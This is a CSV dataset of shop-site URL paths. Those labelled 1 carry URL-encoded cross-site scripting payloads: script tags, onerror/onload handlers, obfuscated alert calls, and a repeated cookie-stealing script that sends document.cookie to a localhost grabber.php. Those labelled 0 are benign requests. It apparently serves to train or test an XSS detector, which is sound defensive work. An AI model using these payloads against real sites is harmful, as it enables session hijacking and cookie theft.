text,label
/cart?book=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?q=furniture&color=green,0
/search?q=bottle&color=yellow,0
/wishlist?item=pen&action=add,0
/search?value1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?item=chair&action=add,0
/search?q=pen,0
/wishlist?item=bottle&action=add&color=red&size=medium,0
/cart?action=update&item=book&color=green,0
/products?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/cart?query=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?item=shirt&action=add,0
/wishlist?item=shirt&action=remove&size=large,0
/login?apple=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?item=shirt&quantity=28,0
/products?category=electronics&page=5&color=black,0
/wishlist?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?laptop=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/cart?action=update&item=pen,0
/search?q=tablet,0
/order?item=notebook&quantity=43,0
/wishlist?item=phone&action=remove&size=medium,0
/api?query=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?password123=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?search_term=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?shoes=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?search_term=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=electronics,0
/wishlist?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?phone=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?item=pen&action=remove&color=black,0
/cart?action=remove&item=tablet,0
/order?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/cart?action1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?apple=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/cart?query=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/checkout?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/user/profile?id=7479&view=summary&size=large,0
/login?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/search?q=phone,0
/cart?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?apple=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?password123=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api?electronics=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?banana=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=5811&view=summary&color=yellow,0
/order?item=tablet&quantity=45&category=furniture,0
/cart?action=add&item=pen,0
/wishlist?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?book=%3Csvg%20onload%3Dalert%281%29%3E,1
/products?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api?query=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?username1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=furniture,0
/wishlist?value1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?shoes=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/search?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api?shoes=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?apple=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?username1=%3Csvg%20onload%3Dalert%281%29%3E,1
/wishlist?phone=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=groceries&page=9&size=small,0
/api/items?id=773&details=true,0
/cart?action1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/cart?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?laptop=%3Csvg%20onload%3Dalert%281%29%3E,1
/search?q=clothing,0
/order?item=apple&quantity=69,0
/order?item=notebook&quantity=15&category=clothing,0
/cart?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?book=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api/items?id=627&details=true&color=white,0
/order?item=phone&quantity=82,0
/products?query=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?phone=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?electronics=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=bottle&quantity=55&color=yellow,0
/wishlist?book=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/cart?book=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?action=add&item=bottle,0
/user/profile?id=8835&view=summary,0
/cart?query=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/user/profile?id=7424&view=summary,0
/checkout?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?apple=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=511&currency=USD&color=blue,0
/checkout?total=90&currency=USD,0
/order?item=tablet&quantity=81&category=electronics,0
/search?search_term=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?apple=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/wishlist?password123=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=clothing&page=6&size=medium,0
/cart?action=remove&item=notebook,0
/api/items?id=589&details=true,0
/order?banana=%3Csvg%20onload%3Dalert%281%29%3E,1
/order?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/login?username1=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?action=remove&item=tablet,0
/cart?action=update&item=pen,0
/checkout?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?item=notebook&action=add&color=blue,0
/api/items?id=788&details=true&size=large,0
/products?category=groceries&page=5&color=black,0
/wishlist?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?search_term=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/wishlist?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?item=chair&quantity=71,0
/login?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?password123=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/checkout?total=350&currency=USD,0
/cart?action=add&item=shirt&color=white&size=small,0
/order?query=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/api/items?id=320&details=true,0
/search?q=stationery&color=red,0
/login?query=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api/items?id=256&details=true&size=small,0
/products?search_term=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/search?query=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?book=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?q=tablet,0
/products?category=electronics&page=2,0
/search?q=tablet,0
/api?book=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=5883&view=summary&color=black,0
/checkout?total=579&currency=USD&color=red,0
/wishlist?book=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?password123=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?value1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/api/items?id=784&details=true&color=yellow,0
/search?q=pen&size=large,0
/order?action1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?shoes=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api?password123=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=759&details=true&size=medium,0
/order?item=bottle&quantity=30&category=furniture,0
/order?item=pen&quantity=46&category=stationery&color=blue,0
/order?item=pen&quantity=64&category=clothing&color=green&size=medium,0
/api/items?id=700&details=true,0
/api?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/login?username1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/checkout?total=142&currency=USD,0
/api?laptop=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?value1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?value1=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?item=apple&action=remove,0
/user/profile?id=9160&view=summary&color=black,0
/products?category=stationery&page=3,0
/user/profile?id=8659&view=summary,0
/wishlist?item=bottle&action=add,0
/cart?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=shirt,0
/api?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=573&details=true&color=red&size=medium,0
/order?item=bottle&quantity=96&category=furniture,0
/api?category1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/products?action1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/search?category1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api?search_term=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?q=bottle,0
/cart?action=remove&item=notebook,0
/order?username1=%3Csvg%20onload%3Dalert%281%29%3E,1
/api/items?id=781&details=true,0
/checkout?electronics=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?search_term=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/api?electronics=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?category=stationery&page=4&color=white,0
/user/profile?id=6051&view=summary,0
/cart?action=view&item=tablet,0
/checkout?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/checkout?total=440&currency=USD,0
/search?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/search?q=phone,0
/wishlist?item=shirt&action=remove,0
/order?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?electronics=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?banana=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/cart?book=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/user/profile?id=7282&view=summary&size=medium,0
/wishlist?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/order?electronics=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/user/profile?id=8780&view=summary,0
/cart?action=view&item=pen,0
/cart?action=remove&item=chair&color=blue&size=large,0
/api?username1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=apple&quantity=27&category=groceries,0
/search?laptop=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/order?item=chair&quantity=50&size=large,0
/cart?action=remove&item=shirt&color=red,0
/api/items?id=662&details=true,0
/user/profile?id=2909&view=summary&color=black&size=large,0
/api/items?id=710&details=true,0
/cart?action=add&item=bottle&size=medium,0
/search?q=furniture&color=yellow&size=medium,0
/checkout?total=513&currency=USD,0
/checkout?total=847&currency=USD&color=green,0
/search?q=chair&color=green&size=small,0
/order?electronics=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=view&item=monitor,0
/order?item=pen&quantity=97&category=groceries,0
/wishlist?query=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api?action1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/products?password123=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/products?category=furniture&page=5,0
/checkout?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/wishlist?username1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=apple&quantity=93&category=groceries&color=blue&size=small,0
/wishlist?item=shirt&action=add,0
/login?category1=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?phone=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/cart?book=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?total=920&currency=USD&size=medium,0
/wishlist?item=book&action=remove,0
/products?category=furniture&page=2&color=green,0
/search?username1=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/login?banana=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/search?q=stationery,0
/checkout?total=611&currency=USD&size=large,0
/wishlist?item=pen&action=remove&size=medium,0
/user/profile?id=7307&view=summary,0
/cart?search_term=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/checkout?total=654&currency=USD&color=red&size=small,0
/api?shoes=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/order?item=tablet&quantity=74&color=red,0
/search?q=furniture,0
/user/profile?id=9331&view=summary,0
/cart?action=remove&item=bottle,0
/search?q=bottle,0
/products?laptop=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/cart?banana=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?phone=%3Csvg%20onload%3Dalert%281%29%3E,1
/api?query=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/login?query=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/user/profile?id=4180&view=summary&color=black,0
/cart?action=add&item=chair,0
/api/items?id=858&details=true&color=green&size=large,0
/search?q=pen&color=yellow&size=large,0
/checkout?laptop=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/order?item=monitor&quantity=31,0
/order?electronics=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api/items?id=480&details=true,0
/checkout?total=486&currency=USD,0
/cart?apple=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=update&item=notebook,0
/login?category1=%3Csvg%20onload%3Dalert%281%29%3E,1
/cart?query=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/search?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/wishlist?item=book&action=add&color=red,0
/login?username1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/products?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?action1=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=pen&quantity=52&category=stationery,0
/wishlist?item=shirt&action=add,0
/wishlist?item=phone&action=remove&color=yellow,0
/user/profile?id=1585&view=summary,0
/cart?password123=%3Csvg%20onload%3Dalert%281%29%3E,1
/api/items?id=968&details=true&color=red&size=large,0
/order?item=notebook&quantity=56&category=groceries,0
/wishlist?item=pen&action=add,0
/cart?value1=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/api?value1=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/login?category1=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/api/items?id=549&details=true,0
/cart?action=view&item=monitor&color=blue,0
/order?item=book&quantity=35&category=groceries,0
/checkout?total=782&currency=USD,0
/api?category1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?action=remove&item=apple,0
/wishlist?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?password123=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/order?item=book&quantity=21,0
/api?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/products?category=stationery&page=2&color=blue,0
/search?q=shirt&size=medium,0
/checkout?electronics=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/wishlist?electronics=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=465&details=true&color=black,0
/cart?book=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/api/items?id=687&details=true,0
/products?category=stationery&page=3&color=green,0
/api/items?id=676&details=true,0
/login?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?phone=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?password123=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/cart?action=remove&item=shirt&size=small,0
/products?password123=%22%3E%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/user/profile?id=8282&view=summary&color=blue&size=medium,0
/products?category=electronics&page=8,0
/checkout?total=752&currency=USD,0
/products?category=clothing&page=6&color=black,0
/search?electronics=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=8467&view=summary&color=blue&size=medium,0
/checkout?action1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/checkout?book=Function%28%22ale%22%2B%22rt%281%29%22%29%28%29%3B,1
/login?apple=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/checkout?shoes=%3Cscript%3Ealert%28%27XSS%27%29%3C/script%3E,1
/api/items?id=932&details=true,0
/products?query=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/user/profile?id=2262&view=summary,0
/products?category=furniture&page=5,0
/products?shoes=%3Cdiv%20onpointerover%3D%22alert%2845%29%22%3EMOVE%20HERE%3C/div%3E,1
/order?item=tablet&quantity=90,0
/wishlist?item=phone&action=remove&color=blue,0
/api?banana=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/api?action1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/cart?action=update&item=shirt&color=yellow,0
/wishlist?search_term=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/cart?value1=%3Cscript%3Edocument.location%3D%27http%3A//localhost/XSS/grabber.php%3Fc%3D%27%2Bdocument.cookie%3C/script%3E,1
/products?electronics=%3Csvg%20onload%3Dalert%281%29%3E,1
/checkout?phone=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/wishlist?apple=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E,1
/order?item=notebook&quantity=86&category=clothing,0
/products?category=furniture&page=6,0
/search?category1=%3Cscript%3Eeval%28%27%5Cx61lert%28%5C%2733%5C%27%29%27%29%3C/script%3E,1
/login?apple=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/api?electronics=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/search?q=chair&color=green,0
/user/profile?id=8478&view=summary,0
/checkout?total=413&currency=USD&color=yellow,0
/api?laptop=%3Cbody%20onload%3Dalert%28%27XSS%27%29%3E,1
/products?book=setTimeout%28%27ale%27%2B%27rt%282%29%27%29%3B,1
/checkout?total=884&currency=USD,0
/order?item=book&quantity=16&category=clothing,0
/api?value1=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E,1
/order?item=shirt&quantity=81&category=clothing,0
